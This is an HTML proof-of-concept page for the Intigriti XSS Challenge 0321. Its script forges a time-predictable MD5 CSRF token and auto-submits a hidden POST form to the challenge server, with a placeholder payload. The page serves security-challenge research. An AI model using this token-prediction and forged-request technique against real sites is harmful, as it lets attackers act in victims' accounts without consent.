<!DOCTYPE html>
<html>
    <head>
        <title>Intigriti 0321 Poc</title>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js"></script>
        <script>
            // Reference : https://server-engineer.tistory.com/373.
            const exploit = function(){
                hash = md5(Math.floor(new Date().getTime() / 1000) + 2);
                payload = "pocas";
                document.getElementById('csrf_').value = hash;
                document.getElementById('notes_').value = payload;
                setTimeout(function(){
                    document.getElementById('base_form').submit();
                }, 50)
            }

            
        </script>
    </head>
    <body>
        <h1>Intigriti XSS Challenge 0321</h1>
        <form id="base_form" action="https://challenge-0321.intigriti.io/" method="POST">
            <input type="hidden" name="csrf" id="csrf_" value="">
            <input type="hidden" name="notes" id="notes_" value="">
            <input type="button" onclick=exploit() value="Trigger">
        </form>
    </body>
</html>